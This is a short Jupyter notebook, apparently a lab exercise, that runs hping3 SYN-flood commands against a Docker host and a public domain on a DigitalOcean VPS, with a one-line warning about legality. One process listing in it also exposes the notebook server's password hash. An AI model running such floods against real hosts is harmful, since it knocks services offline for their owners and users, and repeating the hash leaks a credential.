{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "demanding-ceramic",
   "metadata": {},
   "source": [
    "# DoS Attack\n",
    "Remmeber DoS Attack is an illegal without consent"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "conceptual-keyboard",
   "metadata": {},
   "source": [
    "## On Docker / Internal Network"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "uniform-california",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 agent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "becoming-swift",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "opposed-wednesday",
   "metadata": {},
   "source": [
    "## VPS on DigitalOcean"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "usual-metropolitan",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Process is interrupted.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 doblog-uow.1ez.xyz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "fifty-replica",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
      "jupyter        1  0.0  0.2 244672 63748 ?        Rsl  06:36   0:07 /usr/local/bin/python3 /usr/local/bin/jupyter-notebook --no-browser --ip='0.0.0.0' --NotebookApp.password=argon2:$argon2id$v=19$m=10240,t=10,p=8$eUUKwVme8Br3m2pYymGwMg$sNLq99r8XMIJIHs2I7Sbrw\n",
      "jupyter       11  0.0  0.1 465644 47104 ?        Ssl  07:29   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-72d19dee-5130-44e5-a26f-bb966145275f.json\n",
      "jupyter       25  0.0  0.1 466432 49068 ?        Ssl  07:29   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-9923a1a3-6193-4638-97e9-10ef40f09fc4.json\n",
      "root          38  0.0  0.0      0     0 ?        Z    07:29   0:00 [sudo] <defunct>\n",
      "root          54  9.9  0.0      0     0 ?        Z    10:11   5:26 [hping3] <defunct>\n",
      "jupyter       67  0.0  0.0   2412  1628 pts/0    Ss   10:16   0:00 /usr/bin/sh -l\n",
      "jupyter       79  0.0  0.0   4460  3568 pts/0    S+   10:16   0:00 bash\n",
      "jupyter      102  0.0  0.0   4196  2856 ?        S    11:05   0:00 bash\n",
      "jupyter      103  0.0  0.0   7296  3208 ?        R    11:05   0:00 ps -aux\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
